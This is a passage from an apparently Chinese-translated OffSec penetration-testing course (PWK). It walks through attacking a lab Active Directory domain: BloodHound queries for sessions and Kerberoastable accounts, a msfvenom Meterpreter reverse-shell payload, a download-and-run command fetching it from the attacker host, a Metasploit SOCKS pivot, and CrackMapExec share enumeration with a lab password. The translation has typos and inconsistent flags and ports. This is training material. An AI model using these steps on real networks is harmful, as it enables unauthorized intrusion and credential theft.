

# OffSec

为了查看活动会话，我们将再次在 BloodHound 中使用自定义查询。由于 Cypher 是一种查询语言，我们可以使用以下语法构建关系查询：(NODES)-[RELSHIP]->(NODES)。

在我们的案例中，关系是 [HasSession]。该关系的第一个节点由 (c:Computer) 指定，第二个节点是 (m:User)。这意味着这两个节点之间的边源源于计算机对象。我们将使用 p 来存储和显示数据。

```
MATCH p = (c:Computer)-[HasSession]->(m:User) RETURN p
```

列表 921 - 显示所有活动会话的自定义查询

现在，让我们在 BloodHound 中输入自定义查询：

![](img/336d6ea891e7464f18ad64426619ced4_841_0.png)

图 298：在 BEYOND.COM 域中显示所有活动会话

图 298 显示我们的查询结果有三个活动会话。正如所预期的那样，CLIENTWK1 与用户 marcus 有一个活动会话。

有趣的是，之前识别的域管理员账户 becy 在 MAILSRV1 上有一个活动会话。如果我们能够获取此机器的特权访问，就可以提取此会话的 NTLM 哈希。

第三个活动会话的用户以 SID 的形式显示。当 SID 的域标识符来自本地机器时，BloodHound 使用这种主体的表示方法。对于此会话，这意味着本地管理员（由 RID 500 表示）在 INTERNALSRV1 上有一个活动会话。

我们的下一步是识别域中所有可以进行 Kerberos 攻击的用户。为了做到，我们可以使用 BloodHound 中预置的“List Kerberosable Accounts”查询。

# OffSec

使用 Kali Linux 进行渗透测试

## Kerberos 交互

- 查找高价值组中可进行 Kerbero 攻击的成员
- 列出所有 Kerberoastable 账户
- 查找权限最大的 Kerberoastable 用户
- 查找 AS-REP Roastable 用户 (DontReqPreAuth)

![](img/336d6ea891e7464f18ad64426619ced4_842_0.png)

# 最短路径

图 299：在 BEYOND.com 域中显示所有 kerberoastable 用户账户
图 299 显示，除了 krbtgt 之外，daniela 也是 kerberoastable 的。

> krbtgt 用户账户充密钥发行中心 (KDC)<sup>1302</sup> 的服务账户，负责加密和签名 Kerberos 票据。设置域时，会为该用户账户随机生成密码，使得密码攻击变得不可行。因此，在 Kerberoasting 的语境下，我们通常可以安全地跳过 krbtgt。

让我们通过点击节点，通过 *Node Info* 菜单在 BloodHound 中检查 *daniela* 的 SPN。

<sup>1302</sup> (维基百科，2019)，https://en.wikipedia.org/wiki/Key_distribution_center

PWK - Copyright © 2023 OffSec Services Limited. 保留所有。

# OffSec

使用 Kali Linux 进行渗透测试

搜索节点

| 数据库信息 | 节点信息 | 分析 |
| --- | --- | --- |
| 密码永不过期 | | True |
| 不可被委托 | | False |
| ASREP Roastable | | False |
| 服务主体名称 | http://internalsrv1.beyond.com | |

# 额外属性

| | |
| --- | --- |
| 区分名称 | CN=DANIELA MONROE,CN=USERS,DC=BEYOND,DC=COM |
| 域 | BEYOND.COM |
| 域 ID | S-1-5-21-110408434-2931554705-208130729 |
| 密码未读取 | False |
| | daniela |

图 300：账户 daniela 的 SPN

图 300 显示了映射到 http://internalsrv1.beyond.com 的 SPN。根据此，我们可以假设 INTERNALSRV1 上运行着 Web 服务器。一旦执行了 Kerberoasting 获取 daniela 的明文密码，就可以访问 INTERNALSRV1。
然而，正如之前提到的，发现可操作向量不会中断我们的枚举过程。
因此，让我们使用 SOCKS 代理通过 Nmap 和 CrackMap 进行网络枚举，以识别访问的服务、端口和 SMB 方法。
首先，我们将使用 msfvenom 创建一个执行文件。由于我们可以在整个域中重用该二进制文件，我们将将其存储在 /home/kali/beyond。

```
kali@beyond msfvenom -p windows/x64/meterpreter/reverse-tcp LHOST=192.168.1.5 PORT=443 -f exe -o met.exe
```
[-] 选择了平台 Msf::Windows
[-] 选择了 x64 作为 payload
[-] 指定了编码器，输出原始 payload
Payload 大小：510 字节
exe 文件最终大小：716 字节
保存为：met.exe
现在，让我们在 Metploit 中带有相应的启动多/handler 监听器。此外，我们将 OnSession 设置为 false，这意味着监听器会保持活跃，无需重启。

```
kali@kali:~# sudo meterconsole -q msf > use multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse-tcp
payload => windows/x64/meterpreter/reverse-tcp
msf exploit(multi/handler) > set LHOST 192.168.1.5
LHOST => 192.168.1.5
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > set OnSession false
OnSession => false
msf exploit(multi/handler) > run -j
[*] Exploit 以后台作业 0 运行
[*] Exploit 完成，但未创建会话。[*] 在 http://192.168.1.5:443 启动 HTTPS 会话
```

接下来，我们可以在 CLIENT1 上下载并执行 met.exe。

```
PS:\Users\marcus> wget http://192.168.1.5:4443/met.exe -outfile met.exe
PS:\Users\marcus> .\met.exe
```

在 Metploit 中，将会出现一个新的会话：
[*] Meterpreter session 1 opened (192.168.1.5:443 -> 192.168.50:6434) on 2022-10-11 07:05:22

一旦打开会话，我们就可以使用 multi/manage/autoroute 和 auxiliary/server/socks_proxy 创建 SOCKS 代理，从我们的 Kali 访问内部网络，正如我们在 Metploit Framework 中学习的那样。

```
msf exploit(multi/handler) > use multi/manage/autoroute
msf post(multi/autoroute) > set session 1
session => 1
msf post(multi/autoroute) > run
[!] SESSION 可能与此模块不：
[!] 与 CLIENT1 不兼容
[*] 正在搜索路由的子网。
[*] 已从主机路由表中添加子网 172.16.6.0/255.255.255.0。
[*] Post 模块执行完成
msf post(multi/autoroute) > use auxiliary/server/socks_proxy
msf auxiliary(server/socks_proxy) > set SRVHOST 172.0.0.1
SRVHOST = 172.0.0.1
msf auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module 以后台作业 2 运行。
```

> 列表 926 - 创建 SOCKS 代理从我们的 Kali 机器访问内部网络

SOCKS5 代理已激活，我们可以使用代理访问内部网络。让我们确认 /etc/proxchains.conf 仍然包含之前模块的必要设置。这意味着列表中的 SOCKS5 代理应该是激活的：

```
kali@kali:~/beyonds cat /etc/proxchains.conf
socks5 127.0.0.1 1080
```

> 列表 927 - proxchains 配置文件设置

最后，我们设置通过代理枚举网络。
首先使用 CrackMapExec 的 SMB 获取已识别服务器的基本信息（如 SMB 目标）。我们还将为 john 提供凭据，以便使用 -shares 列出 SMB 共享及其权限。由于 CrackMapExec 没有指定输出文件的选项，我们将收集结果并在稍后进行管理。

```
kali@kali:~/beyonds proxchains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d "DqStTwZpZn#nL" --shares
172.16.6.240 445 (name:DCSRV1) (domain:domain) (signing:False) (SMBv1:False) [+] Windows 10.0 Build 2038 x64
172.16.6.240 445 (name:INTERNALSRV1) (domain:beyond) (signing:False) (SMBv1:False) [+] Windows 10.0 Build 2038 x64
172.16.6.254 445 (name:MAILSV1) (domain:beyond) (signing:False) (SMBv1:False) [+] Windows 10.0 Build 2038 x64
172.16.6.240 445 DCSRV1 [+] beyond.com\john:DqStTwZpZn#nL
172.16.6.241 445 INTERNALSRV1
172.16.6.240 445 DCSRV1 [+] Enumerated shares
172.16.6.240 445 DCSRV1
```

